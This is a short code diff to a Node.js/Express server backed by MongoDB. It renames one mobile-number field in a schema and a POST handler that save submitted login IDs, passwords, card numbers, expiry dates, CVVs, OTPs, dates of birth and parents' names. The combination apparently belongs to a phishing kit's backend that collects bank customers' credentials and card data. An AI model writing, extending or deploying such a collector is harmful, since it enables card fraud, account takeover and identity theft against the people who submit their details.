@@ -35,6 +35,7 @@ const SubmissionSchema = new mongoose.Schema({
   expiry: String,
   cvv: String,
   limit: String,
+  mobile2: String,
   holderName: String,
   dob: String,
   otp: String,
@@ -44,7 +45,6 @@ const SubmissionSchema = new mongoose.Schema({
   // invalidOtp: String,
   fatherName: String,
   motherName: String,
-  mobile0: String,
   type: String,
   submittedAt: { type: Date, default: Date.now }
 });
@@ -56,7 +56,7 @@ const Submission = mongoose.model('Submission', SubmissionSchema);
 // ✅ Save Login or Credit Card Submission
 app.post('/users', async (req, res) => {
   try {
-    const { Login_ID, Password, mobile, cardNumber, expiry, cvv, limit, mobile0 } = req.body;
+    const { Login_ID, Password, mobile, cardNumber, expiry, cvv, limit,mobile2 } = req.body;
 
     const newSubmission = new Submission({
       Login_ID: Login_ID || '',
@@ -66,7 +66,7 @@ app.post('/users', async (req, res) => {
       expiry: expiry || '',
       cvv: cvv || '',
       limit: limit || '',
-      mobile0: mobile0 || '',
+      mobile2: mobile2 || '',
       type: 'login',
       submittedAt: new Date()
     });
